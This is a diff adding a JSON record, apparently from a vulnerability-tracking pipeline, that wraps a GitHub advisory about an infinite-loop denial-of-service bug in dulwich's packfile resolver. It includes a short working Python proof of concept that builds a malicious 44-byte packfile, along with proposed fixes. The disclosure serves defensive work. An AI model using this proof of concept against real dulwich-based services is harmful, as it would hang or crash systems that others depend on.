@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"comments\": 0, \"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/170020125?v=4\", \"events_url\": \"https://api.github.com/users/LukeBanto/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/LukeBanto/followers\", \"following_url\": \"https://api.github.com/users/LukeBanto/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/LukeBanto/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/LukeBanto\", \"id\": 170020125, \"login\": \"LukeBanto\", \"node_id\": \"U_kgDOCiJNHQ\", \"organizations_url\": \"https://api.github.com/users/LukeBanto/orgs\", \"received_events_url\": \"https://api.github.com/users/LukeBanto/received_events\", \"repos_url\": \"https://api.github.com/users/LukeBanto/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/LukeBanto/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/LukeBanto/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/LukeBanto\", \"user_view_type\": \"public\"}}], \"cve_id\": null, \"cvss\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-835\", \"name\": \"Loop with Unreachable Exit Condition ('Infinite Loop')\"}], \"description\": \"### Affected file\\n* `dulwich/pack.py` (Method: `Pack.resolve_object`)\\n\\n### Description / Summary\\nA High-severity Denial of Service (DoS) vulnerability exists in the `Pack.resolve_object` method. When resolving an `OFS_DELTA` object, the resolver calculates the base offset using `base_offset = obj_offset - delta_offset`.\\n\\nIf a malicious packfile contains an `OFS_DELTA` object where `delta_offset` is `0`, the calculation `obj_offset - 0` resolves back to the current object's own offset. Because the implementation lacks a depth counter, a \\\"visited\\\" set, or an explicit rejection of `delta_offset == 0`, the resolver enters an infinite recursive loop, exhausting CPU resources and eventually crashing the process.\\n\\n**Vulnerable Code Breakdown (`dulwich/pack.py`):**\\n```python\\nelif obj_type == OFS_DELTA:\\n    delta_offset = parse_pack_object_offset_at(...)\\n    base_offset = obj_offset - delta_offset          # VULNERABILITY: Self-reference if delta_offset == 0\\n    base_type, base_data = self.resolve_object(...)  # VULNERABILITY: Infinite recursion\\n```\\n\\n### Potential impact\\n\\nAn attacker can trigger this infinite loop via any operation that walks packfiles (e.g., `dulwich clone`, `fetch`, `cat-file`, or internal `Pack.__getitem__` lookups). \\n\\n1. **CPU Exhaustion:** The process will spin at 100% CPU indefinitely.\\n2. **Denial of Service:** Any service using `dulwich` (web interfaces, CI/CD runners) will hang or crash, preventing legitimate repository access.\\n3. **Protocol Incompatibility:** This behavior violates the Git packfile specification. The standard `git` C client explicitly guards against this: `if (!base_offset) die(\\\"delta offset == 0 is invalid\\\");`.\\n\\n### POC (Proof of Concept)\\nThe following Python script generates a 44-byte packfile that triggers the loop:\\n\\n```python\\nfrom dulwich.pack import Pack\\nimport struct, zlib, tempfile, os\\n\\n# Build a single OFS_DELTA entry whose delta_offset is 0\\ntype_ofs_delta = 6\\nheader = bytes([(type_ofs_delta << 4) | 0])\\nofs_bytes = bytes([0x00]) # delta_offset = 0\\nbody = zlib.compress(b'')\\nraw = header + ofs_bytes + body\\n\\npack = b'PACK' + struct.pack('>I', 2) + struct.pack('>I', 1) + raw + (b'\\\\x00' * 20)\\n\\nfd, path = tempfile.mkstemp(suffix='.pack')\\nos.write(fd, pack); os.close(fd)\\n\\n# Trigger: This call never returns and spins at 100% CPU\\np = Pack(path)\\nobj = p[list(p.iterobjects())[0]]\\n```\\n\\n### Possible solution\\n1. **Explicit Guard:** Add a check in `Pack.resolve_object` to reject `delta_offset == 0`:\\n   ```python\\n   if delta_offset == 0:\\n       raise CorruptPacksFile(\\\"OFS_DELTA has self-referential delta_offset=0\\\")\\n   ```\\n2. **Recursion Depth:** Implement a depth limit (e.g., `MAX_DELTA_DEPTH = 50`) to prevent long, non-looping chains of deltas (OFS or REF).\", \"ghsa_id\": \"GHSA-35mr-4567-66vg\", \"github_reviewed_at\": \"2026-10-02T18:54:39Z\", \"html_url\": \"https://github.com/advisories/GHSA-35mr-4567-66vg\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-35mr-4567-66vg\"}], \"nvd_published_at\": null, \"published_at\": \"2026-10-02T18:54:39Z\", \"references\": [\"https://github.com/jelmer/dulwich/security/advisories/GHSA-35mr-4567-66vg\", \"https://github.com/jelmer/dulwich/commit/d06ffc3e1aff0ea0a32094debead891be0083eb7\", \"https://github.com/jelmer/dulwich/releases/tag/dulwich-1.2.9\", \"https://github.com/advisories/GHSA-35mr-4567-66vg\"], \"repository_advisory_url\": \"https://api.github.com/repos/jelmer/dulwich/security-advisories/GHSA-35mr-4567-66vg\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/jelmer/dulwich\", \"summary\": \"Dulwich: Infinite Loop Denial of Service (DoS) in Packfile Object Resolution\", \"type\": \"reviewed\", \"updated_at\": \"2026-10-02T18:54:40Z\", \"url\": \"https://api.github.com/advisories/GHSA-35mr-4567-66vg\", \"vulnerabilities\": [{\"first_patched_version\": \"1.2.9\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"dulwich\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 1.2.9\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-35mr-4567-66vg",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "dulwich: < 1.2.9"
+    ],
+    "authentication_required": false,
+    "cves": [],
+    "cvss_score": 6.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "dulwich"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-10-02T19:14:11.918324Z",
+  "provenance": {
+    "content_sha256": "2ca9e7c5baa635e370a4c63421b4b7b46f201625bc3a1dac73dff72102c98431",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-10-02T18:54:39Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-35mr-4567-66vg",
+  "status": "active",
+  "title": "Dulwich: Infinite Loop Denial of Service (DoS) in Packfile Object Resolution",
+  "updated_at": "2026-10-02T18:54:40Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-35mr-4567-66vg"
+}
